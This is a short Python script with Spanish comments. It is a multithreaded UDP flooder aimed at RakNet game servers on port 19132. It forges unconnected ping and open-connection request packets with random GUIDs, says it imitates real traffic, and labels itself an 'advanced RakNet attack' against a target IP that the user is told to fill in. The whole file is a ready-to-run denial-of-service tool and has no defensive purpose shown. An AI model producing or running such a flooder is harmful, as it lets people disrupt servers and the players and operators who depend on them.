import struct
import socket
import time
import threading
import random

# Configuración
ip = "127.0.0.1"        # Cambia por la IP de tu servidor objetivo
port = 19132            # Cambia por el puerto del servidor
duration = 32           # Segundos
threads = 8             # Número de hilos concurrentes

# Constantes RakNet
magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'

# Versiones de protocolo RakNet comunes (puedes agregar más o variar)
protocol_versions = [10, 11, 12, 13, 14]

def random_guid():
    # RakNet GUID es 8 bytes (unsigned long long)
    return random.getrandbits(64)

def build_unconnected_ping():
    packet_id = 0x01
    timestamp = int(time.time() * 1000)
    guid = random_guid()
    packet = struct.pack('!B', packet_id)
    packet += struct.pack('>Q', timestamp)
    packet += magic
    packet += struct.pack('>Q', guid)  # Cliente GUID extra, algunos servidores lo esperan
    return packet

def build_open_conn_req_1():
    packet_id = 0x05
    protocol_version = random.choice(protocol_versions)
    guid = random_guid()
    packet = struct.pack('!B', packet_id)
    packet += magic
    packet += struct.pack('!B', protocol_version)
    packet += struct.pack('>Q', guid)  # Cliente GUID
    return packet

def attack_thread(ip, port, end_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while time.time() < end_time:
        # Simular tráfico real: alternar entre Ping y Handshake
        if random.random() < 0.5:
            packet = build_unconnected_ping()
        else:
            packet = build_open_conn_req_1()
        try:
            sock.sendto(packet, (ip, port))
            sent += 1
        except Exception:
            pass
    return sent

def run_attack(ip, port, duration, threads):
    print(f"Iniciando ataque RakNet avanzado contra {ip}:{port} durante {duration}s con {threads} hilos...")
    end_time = time.time() + duration
    thread_list = []
    sent_total = [0] * threads

    def thread_func(idx):
        sent_total[idx] = attack_thread(ip, port, end_time)

    for i in range(threads):
        t = threading.Thread(target=thread_func, args=(i,))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(f"Ataque finalizado. Paquetes enviados: {sum(sent_total)}")

if __name__ == "__main__":
    run_attack(ip, port, duration, threads)
